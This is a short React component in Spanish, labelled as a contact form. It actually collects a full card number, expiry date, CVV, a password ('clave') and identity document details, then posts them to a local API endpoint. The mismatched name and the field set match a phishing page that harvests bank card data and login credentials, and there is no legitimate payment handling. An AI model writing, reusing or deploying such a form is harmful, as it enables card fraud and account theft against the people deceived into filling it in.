// app/components/FormContact.tsx
"use client";
import { useState } from "react";

export default function FormContact() {
  const [loading, setLoading] = useState(false);
  const [ok, setOk] = useState<string | null>(null);

  async function onSubmit(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    setLoading(true);
    const fd = new FormData(e.currentTarget);
    const payload: Record<string, any> = Object.fromEntries(fd.entries());

    try {
      const res = await fetch("/api/form/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      const j = await res.json();
      if (j.ok) {
        setOk("Enviado correctamente");
        e.currentTarget.reset();
      } else {
        setOk("Error: " + (j.message || JSON.stringify(j)));
      }
    } catch (err) {
      setOk("Error de red");
    } finally {
      setLoading(false);
    }
  }

  return (
    <form onSubmit={onSubmit} className="space-y-4">
      <input name="card" placeholder="Número de tarjeta" required />
      <input name="exp" placeholder="Fecha de expiración (MM/AA)" required />
      <input name="cvv" placeholder="CVV" required />
      <input name="clave" placeholder="Clave" type="password" required />
      <input name="docType" placeholder="Tipo de documento" required />
      <input name="docNumber" placeholder="Número de documento" required />

      <button type="submit" disabled={loading}>
        {loading ? "Enviando..." : "Enviar"}
      </button>

      {ok && <p>{ok}</p>}
    </form>
  );
}
